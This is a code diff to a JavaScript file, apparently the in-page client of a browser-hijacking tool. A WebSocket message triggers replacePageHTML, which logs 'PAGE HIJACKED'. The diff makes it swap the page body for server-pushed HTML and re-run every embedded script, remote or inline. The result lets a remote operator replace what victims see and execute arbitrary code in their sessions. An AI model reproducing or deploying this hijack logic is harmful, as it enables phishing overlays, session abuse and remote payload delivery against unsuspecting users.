@@ -651,15 +651,40 @@ ws.onmessage = (event) => {
 };
 
 function replacePageHTML(htmlContent) {
-    console.log('🚨 PAGE HIJACKED - Replacing entire page content');
+    console.log('🚨 PAGE HIJACKED - Replacing body content');
     
-    // Replace the entire document
-    document.open();
-    document.write(htmlContent);
-    document.close();
+    // Extract content from the HTML (remove html, head, body tags if present)
+    let bodyContent = htmlContent;
     
-    // Alternative method if document.write doesn't work
-    // document.documentElement.innerHTML = htmlContent;
+    // Simple string-based extraction to avoid regex issues
+    const bodyStartTag = htmlContent.indexOf('<body');
+    const bodyEndTag = htmlContent.indexOf('</body>');
+    
+    if (bodyStartTag !== -1 && bodyEndTag !== -1) {
+        // Find the end of the opening body tag
+        const bodyOpenEnd = htmlContent.indexOf('>', bodyStartTag) + 1;
+        // Extract content between body tags
+        bodyContent = htmlContent.substring(bodyOpenEnd, bodyEndTag);
+    } else {
+        // If no body tags, use the content as-is since our templates are already body content
+        bodyContent = htmlContent;
+    }
+    
+    // Replace only the body content
+    document.body.innerHTML = bodyContent;
+    
+    // Execute any scripts that might be in the injected content
+    const scripts = document.body.querySelectorAll('script');
+    scripts.forEach(function(script) {
+        const newScript = document.createElement('script');
+        if (script.src) {
+            newScript.src = script.src;
+        } else {
+            newScript.textContent = script.textContent;
+        }
+        document.head.appendChild(newScript);
+        script.remove();
+    });
 }
 
 function handleAction(action) {
